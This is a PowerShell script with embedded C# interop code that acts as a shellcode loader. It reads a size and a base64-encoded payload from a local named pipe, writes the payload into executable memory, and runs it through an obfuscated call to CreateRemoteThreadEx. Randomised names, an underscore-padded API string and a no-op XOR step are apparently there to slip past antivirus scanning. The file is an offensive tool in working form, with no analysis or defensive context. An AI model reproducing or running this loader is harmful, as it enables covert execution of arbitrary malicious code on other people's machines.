#Pipe2
$Win32 = @"
using System;
using System.Runtime.InteropServices;


public static class Main
    {

    public static Delegate GetDele(IntPtr ptr){
        return Marshal.GetDelegateForFunctionPointer(ptr, typeof(CRTStub));
    }

    [DllImport("msvcrt.dll")]
    public static extern IntPtr memset(IntPtr dest, uint src, uint count);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string nFunction);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate IntPtr CRTStub(IntPtr h, IntPtr a, IntPtr b, IntPtr c, IntPtr d, UInt32 e,UInt32 p,  out IntPtr f);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]    public delegate IntPtr VAStub(IntPtr a, UIntPtr b, UInt32 c, UInt32 d);

    public static Delegate thQFLBYd(IntPtr ptr){
            return Marshal.GetDelegateForFunctionPointer(ptr, typeof(VAStub));
    }

    [DllImport("msvcrt.dll")]
    public static extern IntPtr malloc(uint src);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary( [MarshalAs(UnmanagedType.LPStr)]string lpFileName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr b,UIntPtr s,uint p,out uint o);

    public static IntPtr PZJvAMbs(IntPtr hModule, string nFunction){
        return GetProcAddress(hModule, nFunction.Replace("_",""));
    }

}
"@

Add-Type -TypeDefinition $Win32
$startMain = [Main]

#PIPING
$pipeName = "Pipe1"
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)

#$pipe.Connect()
$pipe.WaitForConnection()

$bytes = New-Object byte[] 4096
$bytesRead = $pipe.Read($bytes, 0, $bytes.Length)

$SHLEN4 = [System.Text.Encoding]::UTF8.GetString($bytes, 0, $bytesRead)

$pipe.Close()

#SECOND CON

$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", $pipeName, [System.IO.Pipes.PipeDirection]::In)

#$pipe.Connect()
$pipe.WaitForConnection()

$bytes = New-Object byte[] 4096
$bytesRead = $pipe.Read($bytes, 0, $bytes.Length)

$enc = [System.Text.Encoding]::UTF8.GetString($bytes, 0, $bytesRead)
[Byte[]]$shellcode = [System.Convert]::FromBase64String($enc)







#Normal
$Nothing=0

$Allohocate= $startMain::malloc([UInt32]$SHLEN4)

for ($i=0;$i -le ($shellcode.Length-1);$i++) {
    $cc=$startMain::VirtualProtect([IntPtr]($Allohocate.toInt64()+$Nothing+$i), [UInt32]1, [UInt32]0x40, [ref][UInt32]0)

    $sh = $shellcode[$i] -bxor 0x0
    $c = $startMain::memset([IntPtr]($Allohocate.ToInt64()+$Nothing+$i), $sh , 1)

}

$LoadKen32 = $startMain::LoadLibrary("kernel32.dll")

$CRROTETREDA   = $startMain::PZJvAMbs($LoadKen32, "C__re___a___te___R_e__m_o___t__e_T_h____r_e_a__d___E_x_")
$IDK = $startMain::GetDele($CRROTETREDA)

$NEWO = New-Object System.Object
$NEWO | Add-Member NoteProperty -Name fnCRT -Value $IDK

$p=0
$o = $NEWO.fnCRT.Invoke(-1, 0, 0, $Allohocate, 0, 0, 0, [ref]$p)

#PIPE SERVER
#$pipeName = "Pipe2"
#$pipe = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::Out)
#$pipe.WaitForConnection()
#$bytes = [System.Text.Encoding]::UTF8.GetBytes($Allohocate)
#$pipe.Write($bytes, 0, $bytes.Length)
#$pipe.Close()


  

